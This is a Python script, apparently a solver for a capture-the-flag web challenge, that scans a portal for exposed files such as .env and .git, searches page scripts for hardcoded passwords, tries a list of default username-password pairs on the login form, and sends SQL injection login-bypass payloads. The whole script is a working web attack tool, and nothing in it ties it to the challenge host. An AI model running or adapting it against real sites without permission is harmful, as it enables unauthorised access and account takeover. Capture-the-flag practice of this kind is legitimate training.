#!/usr/bin/env python3
"""
Nenron Portal CTF Challenge Solver
This script helps analyze and test the Nenron portal for common web vulnerabilities
"""

import requests
import re
from urllib.parse import urljoin, urlparse
import json
from bs4 import BeautifulSoup
import sys

class NenronPortalAnalyzer:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
        
    def analyze_homepage(self):
        """Analyze the homepage for forms, links, and hidden content"""
        print("[*] Analyzing homepage...")
        try:
            response = self.session.get(self.base_url)
            print(f"[+] Status Code: {response.status_code}")
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Check for comments in HTML
            comments = soup.find_all(string=lambda text: isinstance(text, str) and text.strip().startswith('<!--'))
            if comments:
                print("\n[!] Found HTML comments:")
                for comment in comments:
                    print(f"    {comment.strip()}")
            
            # Find all forms
            forms = soup.find_all('form')
            print(f"\n[*] Found {len(forms)} forms")
            for i, form in enumerate(forms):
                print(f"\n  Form {i+1}:")
                print(f"    Action: {form.get('action', 'None')}")
                print(f"    Method: {form.get('method', 'GET')}")
                
                # Find input fields
                inputs = form.find_all(['input', 'textarea', 'select'])
                for inp in inputs:
                    print(f"    Input: {inp.get('name', 'unnamed')} (type: {inp.get('type', 'text')})")
            
            # Find all links
            links = soup.find_all('a', href=True)
            print(f"\n[*] Found {len(links)} links:")
            for link in links[:10]:  # Show first 10 links
                href = urljoin(self.base_url, link['href'])
                print(f"    {link.text.strip() or 'No text'}: {href}")
            
            # Check for JavaScript files
            scripts = soup.find_all('script', src=True)
            print(f"\n[*] Found {len(scripts)} external scripts:")
            for script in scripts:
                print(f"    {urljoin(self.base_url, script['src'])}")
            
            # Check headers
            print("\n[*] Response Headers:")
            for header, value in response.headers.items():
                print(f"    {header}: {value}")
            
            # Check for cookies
            if response.cookies:
                print("\n[*] Cookies:")
                for cookie in response.cookies:
                    print(f"    {cookie.name}: {cookie.value}")
            
            return soup, response
            
        except Exception as e:
            print(f"[-] Error analyzing homepage: {e}")
            return None, None
    
    def check_common_paths(self):
        """Check for common paths and files"""
        print("\n[*] Checking common paths...")
        common_paths = [
            'robots.txt', '.git/', 'admin/', 'login/', 'api/', 
            'admin.php', 'login.php', 'config.php', '.env',
            'backup/', 'test/', 'debug/', '.htaccess',
            'flag.txt', 'flag', 'password.txt', 'passwords.txt'
        ]
        
        for path in common_paths:
            url = urljoin(self.base_url, path)
            try:
                response = self.session.get(url, timeout=5, allow_redirects=False)
                if response.status_code in [200, 301, 302, 401, 403]:
                    print(f"[+] Found: {url} (Status: {response.status_code})")
                    if response.status_code == 200 and len(response.text) < 500:
                        print(f"    Content: {response.text[:200]}...")
            except:
                pass
    
    def test_sql_injection(self, form_action, params):
        """Test for basic SQL injection vulnerabilities"""
        print(f"\n[*] Testing SQL injection on {form_action}...")
        
        sql_payloads = [
            "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #",
            "admin' --", "admin' #", "' OR 1=1 --",
            "1' OR '1' = '1", "' UNION SELECT NULL--",
            "admin'/*", "' or 1=1#", "' or 1=1--"
        ]
        
        for payload in sql_payloads:
            test_params = params.copy()
            for key in test_params:
                test_params[key] = payload
            
            try:
                response = self.session.post(form_action, data=test_params, timeout=5)
                
                # Check for SQL error messages
                sql_errors = [
                    'SQL syntax', 'mysql_fetch', 'Warning: mysql',
                    'valid MySQL result', 'MySQLSyntaxErrorException',
                    'PostgreSQL', 'valid PostgreSQL result',
                    'Oracle error', 'Oracle driver', 'SQLServer',
                    'sqlite3.OperationalError', 'database error'
                ]
                
                for error in sql_errors:
                    if error.lower() in response.text.lower():
                        print(f"[!] Potential SQL injection with payload: {payload}")
                        print(f"    Error found: {error}")
                        return True
                
                # Check for successful login indicators
                if 'admin' in response.text.lower() or 'dashboard' in response.text.lower():
                    print(f"[!] Possible SQL injection success with: {payload}")
                    print(f"    Response contains admin/dashboard references")
                    return True
                    
            except Exception as e:
                print(f"[-] Error testing payload: {e}")
        
        return False
    
    def check_source_code(self, soup):
        """Check for sensitive information in page source"""
        print("\n[*] Checking source code for sensitive info...")
        
        # Look for passwords in JavaScript
        scripts = soup.find_all('script')
        for script in scripts:
            if script.string:
                # Look for password patterns
                password_patterns = [
                    r'password["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                    r'passwd["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                    r'pwd["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                    r'admin["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                    r'flag["\']?\s*[:=]\s*["\']([^"\']+)["\']'
                ]
                
                for pattern in password_patterns:
                    matches = re.findall(pattern, script.string, re.IGNORECASE)
                    if matches:
                        print(f"[!] Found potential password in JavaScript: {matches}")
    
    def test_default_credentials(self):
        """Test common default credentials"""
        print("\n[*] Testing default credentials...")
        
        # Find login form
        response = self.session.get(self.base_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        login_form = None
        for form in soup.find_all('form'):
            if any(inp.get('type') == 'password' for inp in form.find_all('input')):
                login_form = form
                break
        
        if not login_form:
            print("[-] No login form found")
            return
        
        form_action = urljoin(self.base_url, login_form.get('action', ''))
        
        # Get input field names
        username_field = None
        password_field = None
        
        for inp in login_form.find_all('input'):
            inp_type = inp.get('type', 'text')
            inp_name = inp.get('name', '')
            
            if inp_type == 'password':
                password_field = inp_name
            elif inp_type in ['text', 'email'] and not username_field:
                username_field = inp_name
        
        if not username_field or not password_field:
            print("[-] Could not identify login fields")
            return
        
        # Test credentials
        credentials = [
            ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
            ('admin', 'admin123'), ('administrator', 'password'),
            ('root', 'root'), ('root', 'toor'), ('test', 'test'),
            ('demo', 'demo'), ('admin', 'Nenron'), ('admin', 'nenron'),
            ('admin', 'energy'), ('admin', 'Energy'), ('admin', 'portal')
        ]
        
        for username, password in credentials:
            data = {
                username_field: username,
                password_field: password
            }
            
            try:
                response = self.session.post(form_action, data=data)
                
                # Check for success indicators
                if any(indicator in response.text.lower() for indicator in 
                       ['dashboard', 'welcome admin', 'logout', 'flag']):
                    print(f"[!] Successful login with {username}:{password}")
                    print(f"[+] Response preview: {response.text[:500]}...")
                    
                    # Look for the flag
                    flag_pattern = r'flag\{[^}]+\}|CTF\{[^}]+\}|USCC\{[^}]+\}'
                    flags = re.findall(flag_pattern, response.text, re.IGNORECASE)
                    if flags:
                        print(f"\n[!!!] Found flag: {flags}")
                    
                    return True
                    
            except Exception as e:
                print(f"[-] Error testing {username}:{password} - {e}")
        
        print("[-] No default credentials worked")
        return False

def main():
    url = "http://chals.uscc-cyberbowl-2025.ctf.institute:3006/"
    print(f"[*] Starting Nenron Portal CTF Solver")
    print(f"[*] Target: {url}\n")
    
    analyzer = NenronPortalAnalyzer(url)
    
    # Step 1: Analyze homepage
    soup, response = analyzer.analyze_homepage()
    
    if not soup:
        print("[-] Failed to analyze homepage")
        return
    
    # Step 2: Check common paths
    analyzer.check_common_paths()
    
    # Step 3: Check source code
    analyzer.check_source_code(soup)
    
    # Step 4: Test default credentials
    analyzer.test_default_credentials()
    
    # Step 5: Test SQL injection if forms found
    forms = soup.find_all('form')
    for form in forms:
        action = urljoin(url, form.get('action', ''))
        inputs = form.find_all('input')
        
        params = {}
        for inp in inputs:
            name = inp.get('name')
            if name:
                params[name] = 'test'
        
        if params:
            analyzer.test_sql_injection(action, params)

if __name__ == "__main__":
    main()